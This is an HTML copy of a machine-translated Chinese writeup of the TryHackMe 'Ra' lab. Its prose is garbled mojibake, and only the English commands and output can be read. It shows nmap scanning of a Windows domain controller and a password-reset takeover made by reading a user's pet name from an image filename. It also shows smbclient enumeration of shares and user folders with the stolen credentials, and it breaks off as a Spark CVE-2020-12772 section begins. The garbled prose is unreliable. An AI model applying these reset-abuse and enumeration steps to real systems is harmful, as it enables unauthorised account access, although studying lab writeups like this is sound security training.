<html>
<head>
<title>THM Writeup: Ra</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">THMæŠ¥å‘Š:Ra</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/thm-writeup-ra-7e276f05700?source=collection_archive---------0-----------------------#2022-05-02">https://infosecwriteups.com/thm-writeup-ra-7e276f05700?source=collection_archive---------0-----------------------#2022-05-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/f29bafbe497c0491f9e611e9cc05d24f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*so9fm0Wpt7HMl-a1.jpg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><a class="ae kc" href="https://i.ytimg.com/vi/_WKRXAKX0q0/maxresdefault.jpg" rel="noopener ugc nofollow" target="_blank"> Raä¸‡ç¥ä¹‹ç¥</a>ã€‚</figcaption></figure><p id="8243" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘é€šè¿‡æšä¸¾åœ¨å¼€æ”¾ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ï¼Œæ»¥ç”¨ç½‘ç«™ä¸Šçš„å¯†ç é‡ç½®åŠŸèƒ½ï¼Œå¹¶ä½¿ç”¨CVE-2020â€“12772æå‡æˆ‘åœ¨åŸŸæ§åˆ¶å™¨ä¸Šçš„æƒé™æ¥æ”¶é›†æ‰€æœ‰æŒ‘æˆ˜æ ‡å¿—ï¼Œé€æ­¥å®Œæˆäº†åˆ©ç”¨åŸŸæ§åˆ¶å™¨çš„è¿‡ç¨‹ã€‚è¿™ä¸ªæŒ‘æˆ˜åœ¨TryHackMeå¹³å°ä¸Šæœ‰ï¼Œæ ‡é¢˜ä¸ºâ€œ<strong class="kf ir"> Ra </strong>ï¼Œç”±ç”¨æˆ·â€œ<a class="ae kc" href="https://tryhackme.com/p/4ndr34z" rel="noopener ugc nofollow" target="_blank">T5ã€‘4 NDR 34 z</a>â€å’Œâ€œ<a class="ae kc" href="https://tryhackme.com/p/demoteaching" rel="noopener ugc nofollow" target="_blank"> <em class="lb">é™çº§</em> </a>â€åˆ›å»ºã€‚</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="b30b" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">æ”¾å¼ƒ</h1><p id="9867" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æˆ‘å–œæ¬¢åœ¨ä¸€ç¯‡æ–‡ç« ä¹‹å‰æ·»åŠ ä¸€ä¸ªç®€çŸ­çš„å…è´£å£°æ˜ï¼Œä»¥é¼“åŠ±äººä»¬åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰å°è¯•ä¸€ä¸‹è¿™ä¸ªæˆ¿é—´ï¼Œå› ä¸ºè¿™ç¯‡æ–‡ç« ä¸­æ˜¾ç„¶ä¼šæœ‰<strong class="kf ir">å‰§é€</strong><strong class="kf ir"/>ã€‚æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœä½ å…ˆè‡ªå·±å°è¯•ï¼Œç„¶ååœ¨é‡åˆ°å›°éš¾æˆ–éœ€è¦æç¤ºæ—¶å†å›æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä½ ä¼šæ›´å–œæ¬¢è¿™ä¸ªæŒ‘æˆ˜ã€‚å› æ­¤ï¼Œæ²¡æœ‰ä»»ä½•è¿›ä¸€æ­¥çš„æ‹–å»¶ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="52c4" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">æŒ‘æˆ˜æè¿°</h1><blockquote class="mm mn mo"><p id="338d" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">ä½ å·²ç»è¿›å…¥äº†ä»·å€¼æ•°åäº¿ç¾å…ƒçš„å…¬å¸WindCorpçš„å†…éƒ¨ç½‘ç»œï¼Œè¯¥å…¬å¸æ­£åœ¨è¿›è¡Œä¸€åœºå¤§è§„æ¨¡çš„ç¤¾äº¤åª’ä½“å®£ä¼ æ´»åŠ¨ï¼Œå£°ç§°æ˜¯ä¸å¯æ”»å‡»çš„(å“ˆï¼è¿™ç§è¯´æ³•åˆ°æ­¤ä¸ºæ­¢ï¼).</p><p id="639e" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">ä¸‹ä¸€æ­¥å°†æ˜¯æ‹¿èµ°ä»–ä»¬çš„çš‡å† ä¸Šçš„å®çŸ³ï¼Œå¹¶å®Œå…¨è¿›å…¥ä»–ä»¬çš„å†…éƒ¨ç½‘ç»œã€‚ä½ å‘ç°äº†ä¸€å°æ–°çš„windowsæœºå™¨ï¼Œå®ƒå¯èƒ½ä¼šå¼•å¯¼ä½ å®ç°æœ€ç»ˆç›®æ ‡ã€‚ä½ èƒ½å¾æœè¿™ä¸ªæœ«ç«¯bosså¹¶æ‹¥æœ‰ä»–ä»¬çš„å†…éƒ¨ç½‘ç»œå—ï¼Ÿ</p></blockquote></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="292a" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">ç«¯å£æšä¸¾</h1><p id="ff96" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æˆ‘å¼€å§‹æšä¸¾ç›®æ ‡æœºå™¨ï¼Œç”¨<strong class="kf ir"> NMAP </strong>æ‰§è¡Œå¿«é€Ÿæ‰«ææ¥è¯†åˆ«ä»»ä½•æ‰“å¼€çš„ç«¯å£ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="2f05" class="nb lk iq mx b gy nc nd l ne nf">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report -Pn 10.10.241.18</span><span id="565d" class="nb lk iq mx b gy ng nd l ne nf">PORT      STATE SERVICE          REASON<br/>53/tcp    open  domain           syn-ack ttl 125<br/>80/tcp    open  http             syn-ack ttl 125<br/>88/tcp    open  kerberos-sec     syn-ack ttl 125<br/>135/tcp   open  msrpc            syn-ack ttl 125<br/>139/tcp   open  netbios-ssn      syn-ack ttl 125<br/>389/tcp   open  ldap             syn-ack ttl 125<br/>445/tcp   open  microsoft-ds     syn-ack ttl 125<br/>464/tcp   open  kpasswd5         syn-ack ttl 125<br/>593/tcp   open  http-rpc-epmap   syn-ack ttl 125<br/>636/tcp   open  ldapssl          syn-ack ttl 125<br/>2179/tcp  open  vmrdp            syn-ack ttl 125<br/>3268/tcp  open  globalcatLDAP    syn-ack ttl 125<br/>3269/tcp  open  globalcatLDAPssl syn-ack ttl 125<br/>3389/tcp  open  ms-wbt-server    syn-ack ttl 125<br/>5223/tcp  open  hpvirtgrp        syn-ack ttl 125<br/>5229/tcp  open  jaxflow          syn-ack ttl 125<br/>5262/tcp  open  unknown          syn-ack ttl 125<br/>5263/tcp  open  unknown          syn-ack ttl 125<br/>5269/tcp  open  xmpp-server      syn-ack ttl 125<br/>5270/tcp  open  xmp              syn-ack ttl 125<br/>5275/tcp  open  unknown          syn-ack ttl 125<br/>5276/tcp  open  unknown          syn-ack ttl 125<br/>5985/tcp  open  wsman            syn-ack ttl 125<br/>7070/tcp  open  realserver       syn-ack ttl 125<br/>7443/tcp  open  oracleas-https   syn-ack ttl 125<br/>7777/tcp  open  cbt              syn-ack ttl 125<br/>9090/tcp  open  zeus-admin       syn-ack ttl 125<br/>9091/tcp  open  xmltec-xmlmail   syn-ack ttl 125<br/>9389/tcp  open  adws             syn-ack ttl 125<br/>49671/tcp open  unknown          syn-ack ttl 125<br/>49672/tcp open  unknown          syn-ack ttl 125<br/>49673/tcp open  unknown          syn-ack ttl 125<br/>49674/tcp open  unknown          syn-ack ttl 125<br/>49694/tcp open  unknown          syn-ack ttl 125<br/>49894/tcp open  unknown          syn-ack ttl 125</span></pre><p id="963a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æŸ¥çœ‹è¾“å‡ºï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æœ‰35ä¸ªç«¯å£æ‰“å¼€ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨NMAPæ¥è¯†åˆ«æ¯ä¸ªç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ï¼Œå¹¶ä½¿ç”¨é€šç”¨çš„NSEè„šæœ¬æ¥æŸ¥æ‰¾æˆ‘å¯ä»¥åˆ©ç”¨çš„ä»»ä½•å¸¸è§æ¼æ´ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="38c4" class="nb lk iq mx b gy nc nd l ne nf">nmap -sV -sC -Pn -v -oN nmap-report -p 53,80,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5223,5229,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9090,9091,9389,49671,49672,49673,49674,49694,49894 10.10.215.202</span></pre><p id="7219" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°NMAPçš„å¤§é‡è¾“å‡ºå’Œä¸€äº›æœ‰è¶£çš„æœåŠ¡ï¼Œæˆ‘å¯ä»¥è¿›ä¸€æ­¥åˆ—ä¸¾ã€‚</p></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="3954" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">Webæšä¸¾</h1><p id="0b41" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æŸ¥çœ‹NMAPæœåŠ¡æ‰«æçš„è¾“å‡ºï¼Œæˆ‘å¯ä»¥çœ‹åˆ°åœ¨ç«¯å£80ä¸Šå¯ä»¥è®¿é—®ä¸€ä¸ªç½‘ç«™ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="c5fc" class="nb lk iq mx b gy nc nd l ne nf">80/tcp    open     http                Microsoft IIS httpd 10.0<br/>| http-methods: <br/>|   Supported Methods: OPTIONS TRACE GET HEAD POST<br/>|_  Potentially risky methods: TRACE<br/>|_http-server-header: Microsoft-IIS/10.0<br/>|_http-title: Windcorp.</span></pre><p id="9793" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘è¿˜æ³¨æ„åˆ°NMAPåœ¨æ‰«æ3389ç«¯å£æ—¶å‘ç°äº†ä¸€äº›å…³äºæ½œåœ¨åŸŸåçš„æœ‰ç”¨ä¿¡æ¯ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="cd48" class="nb lk iq mx b gy nc nd l ne nf">3389/tcp  open     ms-wbt-server       Microsoft Terminal Services<br/>| rdp-ntlm-info: <br/>|   Target_Name: WINDCORP<br/>|   NetBIOS_Domain_Name: WINDCORP<br/>|   NetBIOS_Computer_Name: FIRE<br/>|   DNS_Domain_Name: <strong class="mx ir">windcorp.thm</strong> <br/>|   DNS_Computer_Name: <strong class="mx ir">Fire.windcorp.thm</strong><br/>|   DNS_Tree_Name: windcorp.thm<br/>|   Product_Version: 10.0.17763<br/>|_  System_Time: 2022-03-27T10:03:02+00:00<br/>| ssl-cert: Subject: commonName=Fire.windcorp.thm<br/>| Issuer: commonName=Fire.windcorp.thm</span></pre><p id="808e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘å°†<strong class="kf ir"> windcorp.thm </strong>æ·»åŠ åˆ°æˆ‘çš„hostsæ–‡ä»¶ä¸­ï¼Œå¹¶å¯¼èˆªåˆ°è¯¥ç½‘ç«™ã€‚æˆ‘åœ¨ç½‘ç«™ä¸Šå‘ç°äº†ä¸€ä¸ªå¯†ç é‡ç½®é“¾æ¥ï¼Œå®ƒè¦æ±‚æˆ‘åœ¨hostsæ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªåä¸º<strong class="kf ir"> fire.windcorp.thm </strong>çš„å­åŸŸã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/0196655afba8d29616ab5fef8021b4ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:756/format:webp/1*rxFcOctJhqCOIcFsWxGTdA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">é€šè¿‡å¯†ç é‡ç½®é“¾æ¥è¯†åˆ«çš„æ–°å­åŸŸåã€‚</figcaption></figure><p id="5bf4" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">ä¸€æ—¦å­åŸŸè¢«æ·»åŠ åˆ°æˆ‘çš„ä¸»æœºæ–‡ä»¶ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°å¯†ç é‡ç½®è¦æ±‚æˆ‘æäº¤ä¸€ä¸ªæœ‰æ•ˆçš„ç”¨æˆ·åå’Œå›ç­”ä¸€ä¸ªå®‰å…¨é—®é¢˜ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/6e47d3f69cef42bb9a59c7fcc84aa919.png" data-original-src="https://miro.medium.com/v2/resize:fit:1166/format:webp/1*Tg5DhDBq6lR8K8rK8Xo3Xw.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">å¯†ç é‡ç½®å¼¹å‡ºçª—å£ã€‚</figcaption></figure><p id="51df" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘åœ¨ç½‘ç«™ä¸Šæ‰¾åˆ°äº†ä¸€ä»½ITæ”¯æŒäººå‘˜çš„åå•ï¼Œä½†æˆ‘æ²¡æœ‰å°è¯•é‡ç½®ä»–ä»¬çš„å¯†ç ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/f0c634e0993403025b8e512c4ca26747.png" data-original-src="https://miro.medium.com/v2/resize:fit:622/format:webp/1*X4eeYEgd4aPDwBkYKL9XTg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ç½‘ç«™ä¸Šçš„ITæ”¯æŒäººå‘˜åˆ—è¡¨ã€‚</figcaption></figure><p id="53dd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">å°è¯•å¯¼èˆªåˆ°ä»»ä½•æ”¯æŒäººå‘˜é“¾æ¥éƒ½ä¼šå¼•å‘é”™è¯¯ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/232a7fd04f932b575c69cdb47b643d78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1134/format:webp/1*ZIoj5HEPdTDhAooaiNELLA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">æœªèƒ½æ‰“å¼€URIã€‚</figcaption></figure><p id="22c9" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘æ³¨æ„åˆ°åœ¨æ”¯æŒäººå‘˜åˆ—è¡¨ä¸‹é¢æœ‰ä¸€ä¸ªSparkçš„é“¾æ¥ï¼Œæ ¹æ®ä»–ä»¬çš„é¡¹ç›®<a class="ae kc" href="https://www.igniterealtime.org/projects/spark/" rel="noopener ugc nofollow" target="_blank">ç½‘é¡µ</a>:</p><blockquote class="mm mn mo"><p id="3e67" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi translated">Sparkæ˜¯ä¸€æ¬¾å¼€æºçš„è·¨å¹³å°IMå®¢æˆ·ç«¯ï¼Œé’ˆå¯¹ä¼ä¸šå’Œç»„ç»‡è¿›è¡Œäº†ä¼˜åŒ–ã€‚å®ƒå†…ç½®äº†å¯¹ç¾¤èŠã€ç”µè¯é›†æˆå’Œå¼ºå¤§å®‰å…¨æ€§çš„æ”¯æŒã€‚å®ƒè¿˜é€šè¿‡åœ¨çº¿æ‹¼å†™æ£€æŸ¥ã€ç¾¤ç»„èŠå¤©å®¤ä¹¦ç­¾å’Œé€‰é¡¹å¡å¼å¯¹è¯ç­‰åŠŸèƒ½æä¾›äº†å‡ºè‰²çš„æœ€ç»ˆç”¨æˆ·ä½“éªŒã€‚ç»“åˆOpenfireæœåŠ¡å™¨ï¼ŒSparkæ˜¯ä½¿ç”¨ä¸å®‰å…¨çš„å…¬å…±IMç½‘ç»œçš„æœ€ç®€å•å’Œæœ€å¥½çš„æ›¿ä»£æ–¹æ¡ˆã€‚</p></blockquote><p id="44dc" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘å¯ä»¥ä»NMAPçš„æ‰«æè¾“å‡ºä¸­çœ‹åˆ°ï¼Œå¯ä»¥é€šè¿‡ç«¯å£9090è®¿é—®Openfireç®¡ç†æ§åˆ¶å°ï¼Œä½†æ˜¯æˆ‘å°è¯•ç™»å½•æ—¶è¿æ°”ä¸ä½³ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/ffd4c6c2ae5d18f1f9f00f7d0384beb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:748/format:webp/1*cbMULIrfT9sShJ-Ikc2LzA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Openfireç®¡ç†æ§åˆ¶å°ã€‚</figcaption></figure><p id="fd82" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘è¿˜å°è¯•ç”¨FFuFæ¨¡ç³Šä»»ä½•éšè—çš„ç›®å½•ï¼Œä½†æ²¡æœ‰å‘ç°ä»»ä½•æ„Ÿå…´è¶£çš„ä¸œè¥¿ã€‚åœ¨èŠ±äº†æ›´å¤šçš„æ—¶é—´åˆ—ä¸¾ä¹‹åï¼Œæˆ‘æ³¨æ„åˆ°åœ¨é¡µé¢çš„åº•éƒ¨æœ‰ä¸‰ä¸ªå‘˜å·¥çš„åå­—ï¼Œæœ‰è¶£çš„æ˜¯ï¼Œå…¶ä¸­ä¸€ä¸ªç‰µç€ä¸€åªç‹—ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/57fd0c7086bbcc63bfc9e1c0897c2456.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DurZQtzI5aWLCWfgXUliFQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Windcorpçš„å‘˜å·¥ã€‚</figcaption></figure><p id="4f9b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">é‡è®¾å¯†ç æ—¶çš„ä¸€ä¸ªå®‰å…¨é—®é¢˜æ˜¯<strong class="kf ir">æä¾›ä½ æœ€å–œæ¬¢çš„å® ç‰©</strong>çš„åå­—ã€‚å¦‚æœæˆ‘åœ¨ä¸€ä¸ªæ–°çš„æ ‡ç­¾é¡µä¸­æ‰“å¼€å›¾ç‰‡ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°å›¾ç‰‡çš„åå­—åŒ…æ‹¬ä¸»äººçš„ç”¨æˆ·åå’Œå¥¹çš„å® ç‰©çš„åå­—ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/f66d8749642d9465bdb9bee96bf8903a.png" data-original-src="https://miro.medium.com/v2/resize:fit:520/format:webp/1*hqmsUzXutBioJ5B7jY0-qA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ç”¨æˆ·åå’Œå® ç‰©çš„åå­—ã€‚</figcaption></figure><p id="7759" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æˆ‘ç°åœ¨å¯ä»¥é‡ç½®ç”¨æˆ·çš„å¯†ç äº†ã€‚</p><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi no"><img src="../Images/84f2f4b3cfbcc8eb4a3b928bf378d6e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1ZMteXK0t8cDPD9thQTNUw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">ç”¨æˆ·Liç”Ÿæ´»çš„å¯†ç é‡ç½®ã€‚</figcaption></figure></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="85aa" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">SMBæšä¸¾</h1><p id="274a" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">ä»¥å‰ï¼Œæˆ‘æ— æ³•æšä¸¾ä»»ä½•SMBå…±äº«ï¼Œä½†ç°åœ¨æˆ‘å¯ä»¥ä½¿ç”¨<strong class="kf ir"> lilyleçš„</strong>å‡­æ®æ¥è·å¾—è®¿é—®æƒé™ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="4253" class="nb lk iq mx b gy nc nd l ne nf">smbclient -L //10.10.215.202 -U lilyle <br/>Enter WORKGROUP\lilyle's password:</span><span id="ff2f" class="nb lk iq mx b gy ng nd l ne nf">Sharename       Type      Comment<br/>---------       ----      -------<br/>ADMIN$          Disk      Remote Admin  <br/>C$              Disk      Default share <br/>IPC$            IPC       Remote IPC    <br/>NETLOGON        Disk      Logon server share <br/>Shared          Disk                    <br/>SYSVOL          Disk      Logon server share <br/>Users           Disk</span></pre><p id="588e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">æœ‰è¶£çš„æ˜¯ï¼Œåä¸º<strong class="kf ir">çš„SMBå…±äº«å…±äº«</strong>å’Œ<strong class="kf ir">ç”¨æˆ·</strong>ã€‚åœ¨å…±äº«ç›®å½•ä¸­ï¼Œæˆ‘æ‰¾åˆ°äº†ç¬¬ä¸€ä¸ªæ ‡å¿—å’Œå‡ ä¸ªç”¨äºä¸åŒå¹³å°çš„sparkå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="4ff3" class="nb lk iq mx b gy nc nd l ne nf">smbclient //10.10.6.185/Shared -U lilyle<br/><br/>smb: \&gt; dir<br/>  .                         D        0  Sat May 30 01:45:42 2020<br/>  ..                        D        0  Sat May 30 01:45:42 2020<br/>  Flag 1.txt                A       45  Fri May  1 16:32:36 2020<br/>  spark_2_8_3.deb           A 29526628  Sat May 30 01:45:01 2020<br/>  spark_2_8_3.dmg           A 99555201  Sun May  3 12:06:58 2020<br/>  spark_2_8_3.exe           A 78765568  Sun May  3 12:05:56 2020<br/>  spark_2_8_3.tar.gz        A 123216290  Sun May  3 12:07:24 2020</span></pre><figure class="ms mt mu mv gt jr gh gi paragraph-image"><div class="gh gi np"><img src="../Images/a85dfe5ea158bec822d258592fdd8323.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*A2ACij6c_sHe0sju1plpmQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">æ——å¸œ1ã€‚</figcaption></figure><p id="5dfe" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">åœ¨<strong class="kf ir">ç”¨æˆ·</strong>æ–‡ä»¶å¤¹ä¸­ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°åŸŸæ§åˆ¶å™¨ä¸Šæ‰€æœ‰ä¸åŒçš„ç”¨æˆ·è®¾ç½®ã€‚</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="24cc" class="nb lk iq mx b gy nc nd l ne nf">.                         DR        0  Sat May  2 23:05:58 2020<br/>  ..                      DR        0  Sat May  2 23:05:58 2020<br/>  Administrator            D        0  Sun May 10 12:18:11 2020<br/>  All Users            DHSrn        0  Sat Sep 15 08:28:48 2018<br/>  angrybird                D        0  Fri May  1 13:59:20 2020<br/>  berg                     D        0  Fri May  1 13:59:20 2020<br/>  bluefrog579              D        0  Fri May  1 13:59:20 2020<br/>  brittanycr               D        0  Sun May  3 00:36:46 2020<br/>  brownostrich284          D        0  Fri May  1 13:59:20 2020<br/>  buse                     D        0  Sun Mar 27 18:20:18 2022<br/>  Default                DHR        0  Fri May  1 00:35:11 2020<br/>  Default User         DHSrn        0  Sat Sep 15 08:28:48 2018<br/>  desktop.ini            AHS      174  Sat Sep 15 08:16:48 2018<br/>  edward                   D        0  Fri May  1 13:59:20 2020<br/>  freddy                   D        0  Sun May  3 00:30:16 2020<br/>  garys                    D        0  Fri May  1 13:59:20 2020<br/>  goldencat416             D        0  Sun Mar 27 19:21:06 2022<br/>  goldenwol                D        0  Fri May  1 13:59:20 2020<br/>  happ                     D        0  Fri May  1 13:59:20 2020<br/>  happyme                  D        0  Fri May  1 13:59:20 2020<br/>  Luis                     D        0  Fri May  1 13:59:20 2020<br/>  orga                     D        0  Fri May  1 13:59:20 2020<br/>  organicf                 D        0  Fri May  1 13:59:20 2020<br/>  organicfish718           D        0  Sun Mar 27 19:21:59 2022<br/>  pete                     D        0  Fri May  1 13:59:20 2020<br/>  Public                  DR        0  Thu Apr 30 15:35:47 2020<br/>  purplecat                D        0  Fri May  1 13:59:20 2020<br/>  purplepanda              D        0  Fri May  1 13:59:20 2020<br/>  sadswan                  D        0  Fri May  1 13:59:20 2020<br/>  sadswan869               D        0  Sun Mar 27 19:23:23 2022<br/>  sheela                   D        0  Fri May  1 13:59:20 2020<br/>  silver                   D        0  Fri May  1 13:59:20 2020<br/>  smallf                   D        0  Fri May  1 13:59:20 2020<br/>  spiff                    D        0  Fri May  1 13:59:20 2020<br/>  tinygoos                 D        0  Fri May  1 13:59:20 2020<br/>  whiteleopard             D        0  Fri May  1 13:59:20 2020</span></pre></div><div class="ab cl lc ld hu le" role="separator"><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh li"/><span class="lf bw bk lg lh"/></div><div class="ij ik il im in"><h1 id="1700" class="lj lk iq bd ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg bi translated">æ˜Ÿç«å¼€æ‹“(CVE-2020â€“12772)</h1><p id="bc91" class="pw-post-body-paragraph kd ke iq kf b kg mh ki kj kk mi km kn ko mj kq kr ks mk ku kv kw ml ky kz la ij bi translated">æˆ‘çœ‹åˆ°å®‰è£…äº†Sparkç‰ˆæœ¬<strong class="kf ir"> 2.8.3 </strong>ã€‚åœ¨å¿«é€Ÿæœç´¢ä¸è¯¥ç‰ˆæœ¬ç›¸å…³çš„æ¼æ´æ—¶ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªç”±æŒ‘æˆ˜è®¾è®¡å¸ˆåˆ›å»ºçš„<a class="ae kc" href="https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md" rel="noopener ugc nofollow" target="_blank"> Github </a>é¡µé¢ï¼Œå…¶ä¸­æ¦‚è¿°äº†ä¸€ä¸ªä¸Sparkç‰ˆæœ¬2.8.3ç›¸å…³çš„æ¼æ´ã€‚æ ¹æ®Githubé¡µé¢ä¸Šæä¾›çš„æ¼æ´æè¿°:</p><blockquote class="mm mn mo"><p id="3ea7" class="kd ke lb kf b kg kh ki kj kk kl km kn mp kp kq kr mq kt ku kv mr kx ky kz la ij bi 